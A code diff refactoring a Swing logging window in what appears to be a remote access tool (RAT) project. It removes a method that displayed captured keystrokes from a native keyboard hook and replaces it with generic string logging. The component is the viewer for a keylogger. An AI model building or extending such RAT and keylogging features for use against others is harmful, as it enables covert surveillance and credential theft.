@@ -4,8 +4,6 @@
 
 package de.sogomn.rat.gui.swing;
 
-import static de.sogomn.rat.util.Constants.LANGUAGE;
-
 import java.awt.BorderLayout;
 import java.awt.Container;
 import java.awt.Dimension;
@@ -16,20 +14,17 @@ import javax.swing.JFrame;
 import javax.swing.JScrollPane;
 import javax.swing.JTextArea;
 
-import org.jnativehook.keyboard.NativeKeyEvent;
+import de.sogomn.rat.gui.ILoggingGui;
 
-public final class LoggingGui extends AbstractSwingGui {
+public final class LoggingSwingGui extends AbstractSwingGui implements ILoggingGui {
 	
 	private JTextArea textArea;
 	private JScrollPane scrollPane;
 	private JButton clear;
 	
 	private static final Dimension SIZE = new Dimension(500, 500);
-	private static final String KEY_MODIFIER_TEXT_FORMAT = " [%s] ";
 	
-	public static final String CLEAR = LANGUAGE.getString("logger.clear");
-	
-	public LoggingGui() {
+	public LoggingSwingGui() {
 		textArea = new JTextArea();
 		scrollPane = new JScrollPane(textArea, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
 		clear = new JButton(CLEAR);
@@ -57,20 +52,8 @@ public final class LoggingGui extends AbstractSwingGui {
 		notifyListeners(controller -> controller.userInput(command, this));
 	}
 	
-	public void log(final int keyCode) {
-		String text = NativeKeyEvent.getKeyText(keyCode);
-		
-		if (text == null) {
-			return;
-		}
-		
-		if (text.length() == 1) {
-			textArea.append(text);
-		} else {
-			text = String.format(KEY_MODIFIER_TEXT_FORMAT, text);
-			
-			textArea.append(text);
-		}
+	public void log(final String message) {
+		textArea.append(message);
 	}
 	
 	public void clear() {
